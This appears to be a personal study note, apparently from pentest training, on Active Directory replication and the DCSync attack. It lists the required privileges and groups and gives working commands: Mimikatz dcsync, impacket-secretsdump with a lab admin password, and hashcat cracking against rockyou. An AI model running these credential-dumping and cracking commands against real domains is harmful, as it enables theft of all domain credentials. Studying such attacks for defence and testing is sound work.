alias:: Domain Controller Synchronization

- Since the Domain Controller is a critical part of the AD infrastructure it's important to add redundancy. That can be acomplished by running multiple DC instances *(or replicas)* within the same domain.
- To help with that, the **[Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN)** was implemented to allow synchronization among multiple DC instances.
- To synchronize *(download)* AD objects from a DC a user can call the [`IDL_DRSGetNCChanges`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) API *(part of DRS)*.
  *Ça va sans dire* that in order to succeed, the domain account submitting the request requires [some special privileges](https://www.secureideas.com/blog/the-other-replicating-directory-changes):
	- *Replicating Directory Changes*
	  logseq.order-list-type:: number
	- *Replicating Directory Changes All*
	  logseq.order-list-type:: number
	- *Replicating Directory Changes in Filtered Set*
	  logseq.order-list-type:: number
- Member of the following groups automatically get all the required permissions assigned.
	- Domain Admins
	- Enterprise Admins
	- Administrators
- #+BEGIN_WARNING
  Even if it's counter-intuitive, DC synchronization is not limited to domain controllers. Instead, any domain user with the right permissions can issue synchronization requests to DCs.
  
  IOW, we can dump all the secrets from an online DC if we perform the request from the right user.
  #+END_WARNING
- Synchronization requests can be send over LDAP or RPC. But DCs only expose password hashes via RPC.
- DCSync Attack
	- Once you got access to a user account in **one of those above mentioned groups** or with **all the above mentioned rights** assigned, then you can impersonate a domain controller. This allows you to request any user credentials from the domain.
	- From Windows
		- You can run [[Mimikatz]] from a domain-joined machine. Let use it to request Dave's password hash.
		  id:: 65a004e9-a008-4ad6-926f-fa50ba4608f6
			- ```
			  lsadump::dcsync /user:corp\dave
			  ```
			-
	- From Linux
		- With [[Impacket-secretsdump]]
			- ```bash
			  impacket-secretsdump \
			  	-just-dc-user dave \
			      corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
			  ```
- Crack retrieved hashes
	- With [[Hashcat]]
		- id:: 65a00895-d0d1-4168-9b92-6dfa7401d3d7
		  ```bash
		  hashcat -m 1000 hashes.dcsync \
		  	/usr/share/wordlists/rockyou.txt \
		      -r /usr/share/hashcat/rules/best64.rule \
		      --force
		  ```